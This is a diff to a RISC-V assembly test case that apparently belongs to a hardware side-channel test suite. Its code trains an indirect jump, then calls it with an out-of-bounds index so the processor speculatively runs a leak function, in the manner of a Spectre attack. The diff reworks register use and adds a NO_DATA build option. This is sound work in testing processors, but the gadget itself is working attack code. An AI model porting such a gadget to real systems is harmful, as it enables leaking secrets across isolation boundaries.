@@ -15,12 +15,18 @@
 .text
 setup:
     # Setup the jump table.
+#ifdef NO_DATA
+    li s0, 0x80001000
+    li s1, 0x80001040
+#else
     lla s0, jump_table
+    lla s1, arr
+#endif
 
     lla t0, legit_target
     sd t0, LEGIT_FUNC_IDX(s0)
-    lla t0, leak_target
-    sd t0, LEAK_FUNC_IDX(s0)
+    lla t1, leak_target
+    sd t1, LEAK_FUNC_IDX(s0)
 
     fence
 
@@ -28,17 +34,15 @@ attacker:
   # Training: call leak function with in-bounds index.
   .rept TRAINING_ROUNDS
   li  a0, LEAK_FUNC_IDX
-  lla a1, arr
-  nop
+  mv a1, s1
   call victim
   .endr
 
   # Attack: call legit function with out-of-bounds index. The victim
   # will speculatively jump to the leak function instead of the legit one.
   li  a0, LEGIT_FUNC_IDX
-  lla a1, arr
+  mv a1, s1
   addi a1, a1, OOB_IDX
-  nop
   call victim
 
   # Illegal instruction: end of the test case.
@@ -53,11 +57,10 @@ attacker:
 .align 4
 victim:
   # Save ret address.
-  mv  s1, ra
+  mv  s2, ra
 
   # Calculate jump target.
-  lla t0, jump_table
-  add t0, t0, a0
+  add t0, s0, a0
   ld  t1, 0(t0)
 
   # Slow down jump with mul/div by a non-power-of-two.
@@ -67,11 +70,10 @@ victim:
   mul t1, t1, t2
   div t1, t1, t2
   # Indirect jump.
-  nop
   jalr ra, t1
 
   # Restore ret address.
-  mv  ra, s1
+  mv  ra, s2
   ret
 
 # Legit target: do nothing.
@@ -86,6 +88,7 @@ leak_target:
   ret
 
 
+#ifndef NO_DATA
 .data
 jump_table:
   .dword 0x0000000000000000
@@ -153,3 +156,4 @@ arr:
  .dword 0x00000000deadbeef
  .dword 0x00000000deadbeef
  .dword 0x00000000deadbeef
+#endif
